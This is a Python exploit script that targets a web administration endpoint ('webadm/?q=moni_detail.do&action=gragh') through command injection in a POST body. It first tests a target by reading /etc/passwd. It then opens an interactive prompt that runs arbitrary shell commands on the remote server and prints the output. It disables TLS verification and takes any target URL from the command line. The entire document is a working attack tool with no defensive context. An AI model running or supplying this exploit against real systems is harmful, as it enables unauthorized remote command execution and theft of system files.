#!/usr/bin/python3

import sys
import requests
import os
import re
from urllib3.exceptions import InsecureRequestWarning


def Checking():
    try:
        payload = target + "webadm/?q=moni_detail.do&action=gragh"
        CkData = "'|cat /etc/passwd||'"
        response = requests.post(url=payload, data=CkData, headers=headers, verify=False, timeout=10)
        if (response.status_code == 200 and 'root:' in response.text):
            print("[+] Target is vuln")
            return True
        else:
            print("[-] Target is not vuln")
            return False
    except Exception as e:
        print("[-] Server error")


def Exploit():
    while True:
        try:
            payload = target + "webadm/?q=moni_detail.do&action=gragh"
            command = input("# ")
            if (command == 'exit'):
                sys.exit()
            if (command == 'cls'):
                os.system("cls")
                continue
            ExpData = "'|" + command + "||'"
            # print(data)
            response = requests.post(url=payload, headers=headers, data=ExpData, verify=False, timeout=10)
            # print(response.text)
            result = re.match(r'<html>(.|\n)*</html>', response.text)
            CmdShow = response.text.replace(result[0], "")
            print(CmdShow)
        except Exception as e:
            print("[-] Server not support this command")


if __name__ == '__main__':
    if (len(sys.argv) < 2):
        print("UseAge: python3 explot.py target")
        print("Example: python3 explot.py https://192.168.1.2/")
        sys.exit()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    target = sys.argv[1]
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    while Checking() is True:
        Exploit()
